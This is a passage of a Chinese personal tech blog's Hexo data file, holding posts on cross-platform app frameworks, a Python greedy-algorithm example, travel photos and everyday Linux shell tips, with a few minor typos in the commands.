title=\"3.自渲染方案\"></a>3.自渲染方案</h3><blockquote>\n<p>利用Skia重新实现渲染管线，不依赖原生组件；</p>\n</blockquote>\n<h4 id=\"Flutter\"><a href=\"#Flutter\" class=\"headerlink\" title=\"Flutter\"></a>Flutter</h4><p>一套代码库构建精美的、原生平台编译的多平台应用；</p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/04aafee09057dff4.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/b4b787eb7bce2d58.jpg\"></p>\n<h3 id=\"4-小程序方案\"><a href=\"#4-小程序方案\" class=\"headerlink\" title=\"4.小程序方案\"></a>4.小程序方案</h3><blockquote>\n<p>使用小程序DSL+JS开发，通过中间层桥接后调用原生能力，使用webview来渲染UI界面</p>\n</blockquote>\n<h4 id=\"字节小程序\"><a href=\"#字节小程序\" class=\"headerlink\" title=\"字节小程序\"></a>字节小程序</h4><h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/78dda77ddb939d0d.jpg\"></h4><h4 id=\"时间管线\"><a href=\"#时间管线\" class=\"headerlink\" title=\"时间管线\"></a>时间管线</h4><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/55a31d9ac425d819.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/812f79882c5af955.jpg\"></p>\n<h3 id=\"5-方案比较\"><a href=\"#5-方案比较\" class=\"headerlink\" title=\"5.方案比较\"></a>5.方案比较</h3><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/3ce883f80ef07420.jpg\"></p>\n<h2 id=\"三、基于小程序跨端实践\"><a href=\"#三、基于小程序跨端实践\" class=\"headerlink\" title=\"三、基于小程序跨端实践\"></a>三、基于小程序跨端实践</h2><h3 id=\"1-开发步骤\"><a href=\"#1-开发步骤\" class=\"headerlink\" title=\"1.开发步骤\"></a>1.开发步骤</h3><ul>\n<li>下载开发者工具</li>\n<li>开发、调试</li>\n<li>小程序上传</li>\n</ul>\n<h3 id=\"2-性能优化\"><a href=\"#2-性能优化\" class=\"headerlink\" title=\"2.性能优化\"></a>2.性能优化</h3><h5 id=\"优化意义\"><a href=\"#优化意义\" class=\"headerlink\" title=\"优化意义\"></a>优化意义</h5><ul>\n<li>留住用户</li>\n<li>提升转化率</li>\n<li>提升用户体验</li>\n</ul>\n<h5 id=\"性能指标\"><a href=\"#性能指标\" class=\"headerlink\" title=\"性能指标\"></a>性能指标</h5><figure class=\"highlight brainfuck\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs brainfuck\"><span class=\"hljs-comment\">Loading</span><span class=\"hljs-literal\">--</span>&gt;<span class=\"hljs-comment\">FP</span><span class=\"hljs-literal\">--</span>&gt;<span class=\"hljs-comment\">LCP</span><br></code></pre></td></tr></table></figure>\n\n<ul>\n<li>加载耗时</li>\n<li>取消率</li>\n<li>重启率</li>\n<li>卡死次数占比</li>\n<li>LCP到达率</li>\n<li>白屏率</li>\n<li>…</li>\n</ul>\n<h5 id=\"优化手段\"><a href=\"#优化手段\" class=\"headerlink\" title=\"优化手段\"></a>优化手段</h5><p><img src=\"https://s3.bmp.ovh/imgs/2023/02/04/74198b1d11beee76.jpg\"></p>\n<h2 id=\"四、总结\"><a href=\"#四、总结\" class=\"headerlink\" title=\"四、总结\"></a>四、总结</h2><figure class=\"highlight mathematica\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs mathematica\"><span class=\"hljs-built_in\">Write</span> <span class=\"hljs-built_in\">Once</span>、<span class=\"hljs-built_in\">Run</span> <span class=\"hljs-variable\">Anywhere</span>！<br></code></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n"},{"title":"贪心算法","date":"2021-08-29T10:03:45.000Z","mp3":null,"cover":"img/bg15.jpg","_content":"\n## 贪心算法\n\n**思想：每一步都选择局部最优解** \n\n```python\n#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；\n#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；\n\n# 州名\nstates_need = set([\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\"])\n\n# 可供选择的电台\nstations = {}\nstations[\"kone\"] = set([\"a\", \"d\", \"e\"])\nstations[\"ktwo\"] = set([\"e\", \"b\", \"f\"])\nstations[\"kthree\"] = set([\"a\", \"g\"])\nstations[\"kfoue\"] = set([\"c\", \"e\", \"g\"])\n\n# 最终决定的电台\nfinal_station = set()\n\nwhile states_need:\n    bestStation = None\n    states_covered = set()\n    for station, states in stations.items():\n        # 计算已经覆盖的并集\n        covered = states_need & states\n        if len(covered) > len(states_covered):\n            bestStation = station\n            states_covered = covered\n\n    states_need -= states_covered\n    final_station.add(bestStation)\n\nprint(final_station)\n\n```\n\n","source":"_posts/贪心算法.md","raw":"---\ntitle: 贪心算法\ndate: 2021-08-29 18:03:45\ncategories: \n    - 算法\ntags: \n    - 笔记\n    - 贪心算法\nmp3: \ncover: img/bg15.jpg\n---\n\n## 贪心算法\n\n**思想：每一步都选择局部最优解** \n\n```python\n#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；\n#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；\n\n# 州名\nstates_need = set([\"a\", \"b\", \"c\", \"d\", \"e\", \"f\", \"g\"])\n\n# 可供选择的电台\nstations = {}\nstations[\"kone\"] = set([\"a\", \"d\", \"e\"])\nstations[\"ktwo\"] = set([\"e\", \"b\", \"f\"])\nstations[\"kthree\"] = set([\"a\", \"g\"])\nstations[\"kfoue\"] = set([\"c\", \"e\", \"g\"])\n\n# 最终决定的电台\nfinal_station = set()\n\nwhile states_need:\n    bestStation = None\n    states_covered = set()\n    for station, states in stations.items():\n        # 计算已经覆盖的并集\n        covered = states_need & states\n        if len(covered) > len(states_covered):\n            bestStation = station\n            states_covered = covered\n\n    states_need -= states_covered\n    final_station.add(bestStation)\n\nprint(final_station)\n\n```\n\n","slug":"贪心算法","published":1,"updated":"2021-08-30T13:37:44.000Z","_id":"clg29vyic0073ao9c1tl6bfdw","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"贪心算法\"><a href=\"#贪心算法\" class=\"headerlink\" title=\"贪心算法\"></a>贪心算法</h2><p><strong>思想：每一步都选择局部最优解</strong> </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；</span><br><span class=\"hljs-comment\">#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；</span><br><br><span class=\"hljs-comment\"># 州名</span><br>states_need = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;b&quot;</span>, <span class=\"hljs-string\">&quot;c&quot;</span>, <span class=\"hljs-string\">&quot;d&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;f&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br><br><span class=\"hljs-comment\"># 可供选择的电台</span><br>stations = &#123;&#125;<br>stations[<span class=\"hljs-string\">&quot;kone&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;d&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;ktwo&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;b&quot;</span>, <span class=\"hljs-string\">&quot;f&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;kthree&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;kfoue&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;c&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br><br><span class=\"hljs-comment\"># 最终决定的电台</span><br>final_station = <span class=\"hljs-built_in\">set</span>()<br><br><span class=\"hljs-keyword\">while</span> states_need:<br>    bestStation = <span class=\"hljs-literal\">None</span><br>    states_covered = <span class=\"hljs-built_in\">set</span>()<br>    <span class=\"hljs-keyword\">for</span> station, states <span class=\"hljs-keyword\">in</span> stations.items():<br>        <span class=\"hljs-comment\"># 计算已经覆盖的并集</span><br>        covered = states_need &amp; states<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(covered) &gt; <span class=\"hljs-built_in\">len</span>(states_covered):<br>            bestStation = station<br>            states_covered = covered<br><br>    states_need -= states_covered<br>    final_station.add(bestStation)<br><br><span class=\"hljs-built_in\">print</span>(final_station)<br><br></code></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"","more":"<h2 id=\"贪心算法\"><a href=\"#贪心算法\" class=\"headerlink\" title=\"贪心算法\"></a>贪心算法</h2><p><strong>思想：每一步都选择局部最优解</strong> </p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs python\"><span class=\"hljs-comment\">#问题描述：现有几个州需要使用广播电台覆盖，每个广播电台覆盖的范围不一样，找出需要的最小的州的合集；</span><br><span class=\"hljs-comment\">#解：使用贪心算法，（1）选出一个覆盖最多未覆盖州的电台；重复知道覆盖所有电台；</span><br><br><span class=\"hljs-comment\"># 州名</span><br>states_need = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;b&quot;</span>, <span class=\"hljs-string\">&quot;c&quot;</span>, <span class=\"hljs-string\">&quot;d&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;f&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br><br><span class=\"hljs-comment\"># 可供选择的电台</span><br>stations = &#123;&#125;<br>stations[<span class=\"hljs-string\">&quot;kone&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;d&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;ktwo&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;b&quot;</span>, <span class=\"hljs-string\">&quot;f&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;kthree&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;a&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br>stations[<span class=\"hljs-string\">&quot;kfoue&quot;</span>] = <span class=\"hljs-built_in\">set</span>([<span class=\"hljs-string\">&quot;c&quot;</span>, <span class=\"hljs-string\">&quot;e&quot;</span>, <span class=\"hljs-string\">&quot;g&quot;</span>])<br><br><span class=\"hljs-comment\"># 最终决定的电台</span><br>final_station = <span class=\"hljs-built_in\">set</span>()<br><br><span class=\"hljs-keyword\">while</span> states_need:<br>    bestStation = <span class=\"hljs-literal\">None</span><br>    states_covered = <span class=\"hljs-built_in\">set</span>()<br>    <span class=\"hljs-keyword\">for</span> station, states <span class=\"hljs-keyword\">in</span> stations.items():<br>        <span class=\"hljs-comment\"># 计算已经覆盖的并集</span><br>        covered = states_need &amp; states<br>        <span class=\"hljs-keyword\">if</span> <span class=\"hljs-built_in\">len</span>(covered) &gt; <span class=\"hljs-built_in\">len</span>(states_covered):<br>            bestStation = station<br>            states_covered = covered<br><br>    states_need -= states_covered<br>    final_station.add(bestStation)<br><br><span class=\"hljs-built_in\">print</span>(final_station)<br><br></code></pre></td></tr></table></figure>\n\n"},{"title":"摄影日常","date":"2023-04-04T13:51:45.000Z","mp3":null,"cover":"img/bg17.jpg","_content":"\n\n\n# 鼋头渚\n\n- ## 风铃\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/72eecb13a3eeb7ce.jpg)\n\n- ### 赏樱楼\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/585ac0cd9a73194b.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/cb194db6f07ecf6b.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/2d421f9746a830c4.jpg)","source":"_posts/Sakura.md","raw":"---\ntitle: 摄影日常\ndate: 2023-04-04 21:51:45\ncategories: \n    - 日常\ntags: \n    - 摄影\nmp3: \ncover: img/bg17.jpg\n---\n\n\n\n# 鼋头渚\n\n- ## 风铃\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/72eecb13a3eeb7ce.jpg)\n\n- ### 赏樱楼\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/585ac0cd9a73194b.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/cb194db6f07ecf6b.jpg)\n\n![](https://s3.bmp.ovh/imgs/2023/04/04/2d421f9746a830c4.jpg)","slug":"Sakura","published":1,"updated":"2023-04-04T13:45:38.912Z","_id":"clg2b48w80001989c0n1z19ud","comments":1,"layout":"post","photos":[],"link":"","content":"<h1 id=\"鼋头渚\"><a href=\"#鼋头渚\" class=\"headerlink\" title=\"鼋头渚\"></a>鼋头渚</h1><ul>\n<li><h2 id=\"风铃\"><a href=\"#风铃\" class=\"headerlink\" title=\"风铃\"></a>风铃</h2></li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/72eecb13a3eeb7ce.jpg\"></p>\n<ul>\n<li><h3 id=\"赏樱楼\"><a href=\"#赏樱楼\" class=\"headerlink\" title=\"赏樱楼\"></a>赏樱楼</h3></li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/585ac0cd9a73194b.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/cb194db6f07ecf6b.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/2d421f9746a830c4.jpg\"></p>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"鼋头渚\"><a href=\"#鼋头渚\" class=\"headerlink\" title=\"鼋头渚\"></a>鼋头渚</h1><ul>\n<li><h2 id=\"风铃\"><a href=\"#风铃\" class=\"headerlink\" title=\"风铃\"></a>风铃</h2></li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/72eecb13a3eeb7ce.jpg\"></p>\n<ul>\n<li><h3 id=\"赏樱楼\"><a href=\"#赏樱楼\" class=\"headerlink\" title=\"赏樱楼\"></a>赏樱楼</h3></li>\n</ul>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/585ac0cd9a73194b.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/cb194db6f07ecf6b.jpg\"></p>\n<p><img src=\"https://s3.bmp.ovh/imgs/2023/04/04/2d421f9746a830c4.jpg\"></p>\n"},{"title":"Linux Shell","date":"2023-04-06T10:51:45.000Z","mp3":null,"cover":"img/bg11.jpg","_content":"\n\n# Linux Shell\n\n- 标准输入和命令参数的区别；\n- 后台运行命令在推出中断后也全部退出；\n- 单引号和双引号表示字符串的区别；\n- 有的命令和sudo一起用就会Command not found;\n\n## 一、标准输入和参数的区别\n\n### 1.标准输入和参数\n\n```shell\n#错误\nwhere connect.sh | rm\n\n#正确\nrm $(where connect.sh)\n\n```\n\n> 标准输入就是编程语言中诸如scanf或者readline命令，而参数是指程序的main函数传入的args字符数组；\n>\n> 如果命令能够让终端阻塞，说明该命令接受标准输入，反之不接受；\n\n### 2.后台运行程序\n\n```shell\npython manager.py run server 0.0.0.0\n```\n\n远程登录服务器然后启动Django服务，此时可以通过服务器IP测试，但是终端此时是阻塞状态；\n\n可以在命令后加上`&`符号，命令行就不会阻塞，响应后续命令；\n\n```sh\n(python manager.py runserver 0.0.0.0  &)\n```\n\n> 每一个终端其实都是一个shell进程，在该终端执行的程序其实都是这个shell进程分出来的子进程；\n>\n> 正常情况下，shell进程会阻塞，等待子进程退出才重新接受新的命令；\n>\n> 加上`&`符号只是让shell进程不在阻塞可以继续响应命令，但是无论如何，一旦终端关闭，所有依附的子进程都会关闭；\n>\n> 而（cmd &）这样运行命令，则是将cmd命令挂到systemed系统守护进程；\n\n```shell\nnohub some_cmd &\n```\n\n### 3.单双引号的区别\n\n> 不同的shell会有细微区别；\n>\n> 对于`$`,`()`,这几个符号，单引号包围的字符串不会做任何转义，双引号会；\n\n- 如果`$`读出的参数字符包含空格，应该用双引号括起来，否则会出错；\n\n### 4. sudo找不到命令\n\n有时普通用户可以用的命令，加上sudo权限却无法使用；\n\n- 原因在于该脚本仅存在于该用户的环境变量中；\n- 解决方法是使用脚本文件的路径；\n\n## 二、Linux Shell提高效率的技巧\n\n### 1.相似文件名\n\n```shell\n# onefile twofile threefile\necho {one,two,three}file\n\n#one1 one2 one3 two1 two2 two3 three1 three2 three3\necho {one,two,three}{1,2,3}\n```\n\n应用：命令拓展参数\n\n```shell\n#给file复制一个file.bak的副本\ncp /path/file{,.bak} \n\n#删除file{1，3，5}\nrm file{1,3,4}.txt\n\n#移动相同类型文件\nmv *.{c,cpp} src/\n```\n\n### 2. 输入路径名称太麻烦\n\n```shell\n#返回home\ncd  \n\n#返回上一个目录\ncd -\n\n# !$会替换上一次命令最后的路径\nchmod +x !$\n\n# !*会替换上一次命令输入的所有文件路径\nchmod +x !*\n\n# !! 自动使用上一个命令；\n！！\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","source":"_posts/Linux Shell.md","raw":"---\ntitle: Linux Shell\ndate: 2023-04-06 18:51:45\ncategories: \n    - Linux\ntags: \n    - shell\n    - Linux\nmp3: \ncover: img/bg11.jpg\n---\n\n\n# Linux Shell\n\n- 标准输入和命令参数的区别；\n- 后台运行命令在推出中断后也全部退出；\n- 单引号和双引号表示字符串的区别；\n- 有的命令和sudo一起用就会Command not found;\n\n## 一、标准输入和参数的区别\n\n### 1.标准输入和参数\n\n```shell\n#错误\nwhere connect.sh | rm\n\n#正确\nrm $(where connect.sh)\n\n```\n\n> 标准输入就是编程语言中诸如scanf或者readline命令，而参数是指程序的main函数传入的args字符数组；\n>\n> 如果命令能够让终端阻塞，说明该命令接受标准输入，反之不接受；\n\n### 2.后台运行程序\n\n```shell\npython manager.py run server 0.0.0.0\n```\n\n远程登录服务器然后启动Django服务，此时可以通过服务器IP测试，但是终端此时是阻塞状态；\n\n可以在命令后加上`&`符号，命令行就不会阻塞，响应后续命令；\n\n```sh\n(python manager.py runserver 0.0.0.0  &)\n```\n\n> 每一个终端其实都是一个shell进程，在该终端执行的程序其实都是这个shell进程分出来的子进程；\n>\n> 正常情况下，shell进程会阻塞，等待子进程退出才重新接受新的命令；\n>\n> 加上`&`符号只是让shell进程不在阻塞可以继续响应命令，但是无论如何，一旦终端关闭，所有依附的子进程都会关闭；\n>\n> 而（cmd &）这样运行命令，则是将cmd命令挂到systemed系统守护进程；\n\n```shell\nnohub some_cmd &\n```\n\n### 3.单双引号的区别\n\n> 不同的shell会有细微区别；\n>\n> 对于`$`,`()`,这几个符号，单引号包围的字符串不会做任何转义，双引号会；\n\n- 如果`$`读出的参数字符包含空格，应该用双引号括起来，否则会出错；\n\n### 4. sudo找不到命令\n\n有时普通用户可以用的命令，加上sudo权限却无法使用；\n\n- 原因在于该脚本仅存在于该用户的环境变量中；\n- 解决方法是使用脚本文件的路径；\n\n## 二、Linux Shell提高效率的技巧\n\n### 1.相似文件名\n\n```shell\n# onefile twofile threefile\necho {one,two,three}file\n\n#one1 one2 one3 two1 two2 two3 three1 three2 three3\necho {one,two,three}{1,2,3}\n```\n\n应用：命令拓展参数\n\n```shell\n#给file复制一个file.bak的副本\ncp /path/file{,.bak} \n\n#删除file{1，3，5}\nrm file{1,3,4}.txt\n\n#移动相同类型文件\nmv *.{c,cpp} src/\n```\n\n### 2. 输入路径名称太麻烦\n\n```shell\n#返回home\ncd  \n\n#返回上一个目录\ncd -\n\n# !$会替换上一次命令最后的路径\nchmod +x !$\n\n# !*会替换上一次命令输入的所有文件路径\nchmod +x !*\n\n# !! 自动使用上一个命令；\n！！\n```\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n","slug":"Linux Shell","published":1,"updated":"2023-04-06T03:26:47.795Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg4k4gq00000ww9cg6vr75bw","content":"<h1 id=\"Linux-Shell\"><a href=\"#Linux-Shell\" class=\"headerlink\" title=\"Linux Shell\"></a>Linux Shell</h1><ul>\n<li>标准输入和命令参数的区别；</li>\n<li>后台运行命令在推出中断后也全部退出；</li>\n<li>单引号和双引号表示字符串的区别；</li>\n<li>有的命令和sudo一起用就会Command not found;</li>\n</ul>\n<h2 id=\"一、标准输入和参数的区别\"><a href=\"#一、标准输入和参数的区别\" class=\"headerlink\" title=\"一、标准输入和参数的区别\"></a>一、标准输入和参数的区别</h2><h3 id=\"1-标准输入和参数\"><a href=\"#1-标准输入和参数\" class=\"headerlink\" title=\"1.标准输入和参数\"></a>1.标准输入和参数</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">错误</span><br>where connect.sh | rm<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">正确</span><br>rm $(where connect.sh)<br><br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>标准输入就是编程语言中诸如scanf或者readline命令，而参数是指程序的main函数传入的args字符数组；</p>\n<p>如果命令能够让终端阻塞，说明该命令接受标准输入，反之不接受；</p>\n</blockquote>\n<h3 id=\"2-后台运行程序\"><a href=\"#2-后台运行程序\" class=\"headerlink\" title=\"2.后台运行程序\"></a>2.后台运行程序</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">python manager.py run server 0.0.0.0<br></code></pre></td></tr></table></figure>\n\n<p>远程登录服务器然后启动Django服务，此时可以通过服务器IP测试，但是终端此时是阻塞状态；</p>\n<p>可以在命令后加上<code>&amp;</code>符号，命令行就不会阻塞，响应后续命令；</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs sh\">(python manager.py runserver 0.0.0.0  &amp;)<br></code></pre></td></tr></table></figure>\n\n<blockquote>\n<p>每一个终端其实都是一个shell进程，在该终端执行的程序其实都是这个shell进程分出来的子进程；</p>\n<p>正常情况下，shell进程会阻塞，等待子进程退出才重新接受新的命令；</p>\n<p>加上<code>&amp;</code>符号只是让shell进程不在阻塞可以继续响应命令，但是无论如何，一旦终端关闭，所有依附的子进程都会关闭；</p>\n<p>而（cmd &amp;）这样运行命令，则是将cmd命令挂到systemed系统守护进程；</p>\n</blockquote>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\">nohub some_cmd &amp;<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"3-单双引号的区别\"><a href=\"#3-单双引号的区别\" class=\"headerlink\" title=\"3.单双引号的区别\"></a>3.单双引号的区别</h3><blockquote>\n<p>不同的shell会有细微区别；</p>\n<p>对于<code>$</code>,<code>()</code>,这几个符号，单引号包围的字符串不会做任何转义，双引号会；</p>\n</blockquote>\n<ul>\n<li>如果<code>$</code>读出的参数字符包含空格，应该用双引号括起来，否则会出错；</li>\n</ul>\n<h3 id=\"4-sudo找不到命令\"><a href=\"#4-sudo找不到命令\" class=\"headerlink\" title=\"4. sudo找不到命令\"></a>4. sudo找不到命令</h3><p>有时普通用户可以用的命令，加上sudo权限却无法使用；</p>\n<ul>\n<li>原因在于该脚本仅存在于该用户的环境变量中；</li>\n<li>解决方法是使用脚本文件的路径；</li>\n</ul>\n<h2 id=\"二、Linux-Shell提高效率的技巧\"><a href=\"#二、Linux-Shell提高效率的技巧\" class=\"headerlink\" title=\"二、Linux Shell提高效率的技巧\"></a>二、Linux Shell提高效率的技巧</h2><h3 id=\"1-相似文件名\"><a href=\"#1-相似文件名\" class=\"headerlink\" title=\"1.相似文件名\"></a>1.相似文件名</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">onefile twofile threefile</span><br>echo &#123;one,two,three&#125;file<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">one1 one2 one3 two1 two2 two3 three1 three2 three3</span><br>echo &#123;one,two,three&#125;&#123;1,2,3&#125;<br></code></pre></td></tr></table></figure>\n\n<p>应用：命令拓展参数</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">给file复制一个file.bak的副本</span><br>cp /path/file&#123;,.bak&#125; <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">删除file&#123;1，3，5&#125;</span><br>rm file&#123;1,3,4&#125;.txt<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">移动相同类型文件</span><br>mv *.&#123;c,cpp&#125; src/<br></code></pre></td></tr></table></figure>\n\n<h3 id=\"2-输入路径名称太麻烦\"><a href=\"#2-输入路径名称太麻烦\" class=\"headerlink\" title=\"2. 输入路径名称太麻烦\"></a>2. 输入路径名称太麻烦</h3><figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><code class=\"hljs shell\"><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">返回home</span><br>cd  <br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\">#</span><span class=\"language-bash\">返回上一个目录</span><br>cd -<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!$会替换上一次命令最后的路径</span><br>chmod +x !$<br><span class=\"hljs-meta prompt_\"></span><br><span class=\"hljs-meta prompt_\"># </span><span class=\"language-bash\">!*会替换上一次命令输入的所有文件路径</span><br>chmod +x !*<br><span 